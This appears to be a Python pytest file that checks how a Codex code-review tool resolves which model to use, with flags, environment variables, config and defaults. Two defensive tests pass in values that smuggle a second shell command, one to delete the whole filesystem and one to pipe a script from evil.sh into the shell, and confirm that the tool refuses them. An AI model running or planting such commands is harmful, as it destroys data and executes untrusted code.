"""`tools/review_via_codex.py`'s Codex model resolution (AC33/AC35) — split
from `test_review_via_codex_cli.py` to stay under the 300-line source cap
(iterate-2026-09-18-codex-review-tier-config).

Precedence (resolved inside `run_codex_review` itself, see
`lib.codex_review_model_resolution`): `--codex-model` > this role's session
env var > `shipwright_model_config.json`'s `codex_review`/`codex_plan_review`
key (read from `--worktree-root`'s MAIN repo root) > the hardcoded default in
`lib.codex_review_transport`. The env-var stage's isolated resolution logic
has its own dedicated tests in `test_codex_review_model_resolution.py`;
`test_session_env_var_beats_config` below is this file's one end-to-end case
proving the env var actually reaches `codex exec`'s argv, not just the
resolver's return value.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path
from unittest.mock import Mock

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

from lib import codex_review_transport as transport  # noqa: E402
from tools import review_via_codex  # noqa: E402

VALID_CODE_REVIEW = {"section": "s1", "review": []}


def _patch_available(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(transport, "is_codex_available", lambda **kw: (True, ""))
    monkeypatch.setattr(transport, "_resolve_codex_binary", lambda: "codex")


def _fake_run_writing(payload: dict, *, returncode: int = 0):
    """A `subprocess.run` stand-in for the `codex exec` call.

    `run_codex_review`, reached from `main()`, also calls
    `lib.model_tier_config.load_model_config`, which resolves the MAIN repo
    root via its OWN `subprocess.run(["git", ...])`
    call — since `codex_review_transport.subprocess` IS the shared stdlib
    `subprocess` module object (not a copy), patching
    `transport.subprocess.run` intercepts that git call too. `tmp_path` is
    never a real git repo in these tests, so the git call is meant to fail
    soft (falling back to `project_root` itself, exactly `tmp_path` — the
    same place these tests write `shipwright_model_config.json`); reporting
    a nonzero exit for any non-`codex` argv reproduces that fail-soft path
    instead of crashing on an unexpected-kwargs `TypeError`."""
    def _run(argv, *args, **kwargs):
        if argv[0] != "codex":
            return subprocess.CompletedProcess(argv, 1, stdout="", stderr="not a git repo")
        out_path = Path(argv[argv.index("-o") + 1])
        if returncode == 0:
            out_path.write_text(json.dumps(payload), encoding="utf-8")
        return subprocess.CompletedProcess(argv, returncode, stdout="", stderr="")
    return Mock(side_effect=_run)


def _run_code_role(tmp_path: Path, extra_args: list[str] | None = None) -> tuple[int, dict]:
    agent_md = tmp_path / "code-reviewer.md"
    agent_md.write_text("Review the diff.", encoding="utf-8")
    spec_file = tmp_path / "spec.md"
    spec_file.write_text("the spec contract", encoding="utf-8")
    diff_file = tmp_path / "the.diff"
    diff_file.write_text("+ added line", encoding="utf-8")

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(transport, "is_codex_available", lambda **kw: (True, ""))
        mp.setattr(transport, "_resolve_codex_binary", lambda: "codex")
        fake_run = _fake_run_writing(VALID_CODE_REVIEW)
        mp.setattr(transport.subprocess, "run", fake_run)
        args = [
            "--role", "code", "--worktree-root", str(tmp_path),
            "--agent-md", str(agent_md), "--out-dir", str(tmp_path),
            "--spec-file", str(spec_file), "--diff-file", str(diff_file),
        ] + (extra_args or [])
        exit_code = review_via_codex.main(args)
        launched_argv = fake_run.call_args.args[0]
    return exit_code, {"launched_model": launched_argv[launched_argv.index("-m") + 1]}


def test_unconfigured_uses_the_hardcoded_default(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    exit_code, info = _run_code_role(tmp_path)
    result = json.loads(capsys.readouterr().out)

    assert exit_code == 0
    assert info["launched_model"] == transport.CODEX_REVIEW_MODEL
    assert result["model"] == transport.CODEX_REVIEW_MODEL


def test_configured_model_is_used(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    (tmp_path / "shipwright_model_config.json").write_text(
        json.dumps({"codex_review": "gpt-5.6-terra"}), encoding="utf-8",
    )
    exit_code, info = _run_code_role(tmp_path)
    result = json.loads(capsys.readouterr().out)

    assert exit_code == 0
    assert info["launched_model"] == "gpt-5.6-terra"
    assert result["model"] == "gpt-5.6-terra"


def test_session_env_var_beats_config(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """AC35 end-to-end: the session env var must actually reach `codex exec`'s
    `-m` argv, ranked ahead of the persisted config key and behind an explicit
    `--codex-model` flag (see `test_codex_model_flag_beats_config` below)."""
    (tmp_path / "shipwright_model_config.json").write_text(
        json.dumps({"codex_review": "gpt-5.6-terra"}), encoding="utf-8",
    )
    monkeypatch.setenv("SHIPWRIGHT_CODEX_REVIEW_MODEL", "gpt-5.6-luna")
    exit_code, info = _run_code_role(tmp_path)
    result = json.loads(capsys.readouterr().out)

    assert exit_code == 0
    assert info["launched_model"] == "gpt-5.6-luna"
    assert result["model"] == "gpt-5.6-luna"


def test_codex_model_flag_beats_config(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    (tmp_path / "shipwright_model_config.json").write_text(
        json.dumps({"codex_review": "gpt-5.6-terra"}), encoding="utf-8",
    )
    exit_code, info = _run_code_role(tmp_path, extra_args=["--codex-model", "gpt-5.6-luna"])
    result = json.loads(capsys.readouterr().out)

    assert exit_code == 0
    assert info["launched_model"] == "gpt-5.6-luna"
    assert result["model"] == "gpt-5.6-luna"


def test_plan_review_role_reads_its_own_config_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """`plan_review` must read `codex_plan_review`, never `codex_review` —
    a project pinning the spec/code/doubt cascade must not silently drag
    the plan reviewer's model along with it."""
    _patch_available(monkeypatch)
    (tmp_path / "shipwright_model_config.json").write_text(
        json.dumps({"codex_review": "gpt-5.6-terra", "codex_plan_review": "gpt-6-astra"}),
        encoding="utf-8",
    )
    agent_md = tmp_path / "opus-plan-reviewer.md"
    agent_md.write_text("Review the plan.", encoding="utf-8")
    spec_file = tmp_path / "spec.md"
    spec_file.write_text("the spec contract", encoding="utf-8")
    plan_file = tmp_path / "plan.md"
    plan_file.write_text("the plan body", encoding="utf-8")
    valid_plan_review = {
        "reviewer": "opus-plan-reviewer", "severity": "low", "findings": [], "summary": "ok",
    }
    fake_run = _fake_run_writing(valid_plan_review)
    monkeypatch.setattr(transport.subprocess, "run", fake_run)

    exit_code = review_via_codex.main([
        "--role", "plan_review", "--worktree-root", str(tmp_path),
        "--agent-md", str(agent_md), "--out-dir", str(tmp_path),
        "--spec-file", str(spec_file), "--plan-file", str(plan_file),
    ])

    assert exit_code == 0
    launched_argv = fake_run.call_args.args[0]
    assert launched_argv[launched_argv.index("-m") + 1] == "gpt-6-astra"


def test_hostile_codex_model_flag_hard_errors(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _patch_available(monkeypatch)

    def _run(argv, *args, **kwargs):
        # Only the (harmless, fail-soft) main-repo-root git probe may run
        # before the raise — `codex exec` itself must never be launched.
        assert argv[0] != "codex", "codex exec must not launch for a hostile --codex-model"
        return subprocess.CompletedProcess(argv, 1, stdout="", stderr="not a git repo")

    fake_run = Mock(side_effect=_run)
    monkeypatch.setattr(transport.subprocess, "run", fake_run)
    agent_md = tmp_path / "code-reviewer.md"
    agent_md.write_text("x", encoding="utf-8")
    spec_file = tmp_path / "spec.md"
    spec_file.write_text("x", encoding="utf-8")
    diff_file = tmp_path / "the.diff"
    diff_file.write_text("x", encoding="utf-8")

    exit_code = review_via_codex.main([
        "--role", "code", "--worktree-root", str(tmp_path),
        "--agent-md", str(agent_md), "--out-dir", str(tmp_path),
        "--spec-file", str(spec_file), "--diff-file", str(diff_file),
        "--codex-model", "gpt-5 && rm -rf /",
    ])

    assert exit_code == 1
    result = json.loads(capsys.readouterr().out)
    assert result["status"] == "error"


def test_hostile_config_value_hard_errors_and_does_not_echo_it(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """The config path (an attacker-reachable PR, not just an operator's own
    `--codex-model` flag) gets the same hard-error treatment — and the
    reported reason must not contain the raw value, which the dispatch doc
    interpolates into a double-quoted shell argument (doubt-reviewer HIGH
    and MEDIUM, 2026-09-18)."""
    _patch_available(monkeypatch)
    hostile = 'gpt-5" ; curl evil.sh | sh #'
    (tmp_path / "shipwright_model_config.json").write_text(
        json.dumps({"codex_review": hostile}), encoding="utf-8",
    )

    def _run(argv, *args, **kwargs):
        assert argv[0] != "codex", "codex exec must not launch for a hostile config value"
        return subprocess.CompletedProcess(argv, 1, stdout="", stderr="not a git repo")

    fake_run = Mock(side_effect=_run)
    monkeypatch.setattr(transport.subprocess, "run", fake_run)
    agent_md = tmp_path / "code-reviewer.md"
    agent_md.write_text("x", encoding="utf-8")
    spec_file = tmp_path / "spec.md"
    spec_file.write_text("x", encoding="utf-8")
    diff_file = tmp_path / "the.diff"
    diff_file.write_text("x", encoding="utf-8")

    exit_code = review_via_codex.main([
        "--role", "code", "--worktree-root", str(tmp_path),
        "--agent-md", str(agent_md), "--out-dir", str(tmp_path),
        "--spec-file", str(spec_file), "--diff-file", str(diff_file),
    ])

    assert exit_code == 1
    result = json.loads(capsys.readouterr().out)
    assert result["status"] == "error"
    assert hostile not in result["reason"]
    assert '"' not in result["reason"]
